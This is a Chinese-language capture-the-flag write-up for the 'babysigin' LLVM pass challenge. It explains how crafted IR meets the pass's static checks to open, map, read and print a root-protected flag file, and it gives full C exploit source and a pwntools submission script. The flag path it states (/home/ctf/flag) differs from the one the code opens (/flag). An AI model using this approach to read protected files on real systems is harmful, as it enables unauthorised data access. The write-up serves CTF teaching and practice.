# babysigin

## 题目简述

题目是 LLVM pass。xinetd 以 root 启动 `/usr/bin/python3 /gen.py`，服务端读取用户提交的 Base64 LLVM IR，使用 `/home/ctf/WMCTF.so` 和 `opt` 处理。Docker 中 flag 位于 `/home/ctf/flag`，权限为 `740`，普通文件读取不够，需要借助 pass 暴露的逻辑。

附件确认：

```text
/gen.py
/home/ctf/WMCTF.so
/home/ctf/flag
/home/ctf/opt
```

## 解题过程

### 关键机制

逆向 `WMCTF.so` 后可发现 pass 会识别几个特殊函数：

- `WMCTF_OPEN(char *filename, int mode)`：要求文件名参数来自上层函数传入，并且调用链嵌套层数为 4。
- `WMCTF_MMAP(int size)`：参数必须为 `0x7890`，成功后分配全局 `mmap_addr`。
- `WMCTF_READ(int fd)`：第一个参数必须为 `0x6666`，把已打开 fd 内容读到 `mmap_addr`。
- `WMCTF_WRITE(int fd)`：参数必须来自全局变量且值为 `0x8888`，输出 `mmap_addr`。

因此只要构造 IR 满足这些静态检查，就能执行 `open -> mmap -> read -> write` 输出 flag。

### 求解步骤

构造四层函数调用，让 `/flag` 路径逐层传入 `WMCTF_OPEN`：

```c
int fd = 0x8888;
void WMCTF_OPEN(char *filename, int mode);
void WMCTF_READ(int fd);
void WMCTF_WRITE(int fd);
void WMCTF_MMAP(int size);

int func1(char *path) { WMCTF_OPEN(path, 0); }
int func2(char *path) { func1(path); }
int func3(char *path) { func2(path); }
int func4(char *path) { func3(path); }

int main() {
    char *path = "/flag";
    func4(path);
    WMCTF_MMAP(0x7890);
    WMCTF_READ(0x6666);
    WMCTF_WRITE(fd);
    return 0;
}
```

用 clang 生成 LLVM IR 后 Base64 发送：

```python
from pwn import *
import base64

p = remote(host, port)
content = open("./test.ll", "rb").read()
p.recv()
p.sendline(base64.b64encode(content))
p.interactive()
```

## 方法总结

- 题目重点不是传统内存破坏，而是满足 LLVM pass 的静态模式匹配。
- 四层调用链、`0x7890`、`0x6666`、全局 `0x8888` 是关键约束。
- 附件 `test.ll` 已验证上述约束对应官方 exp。
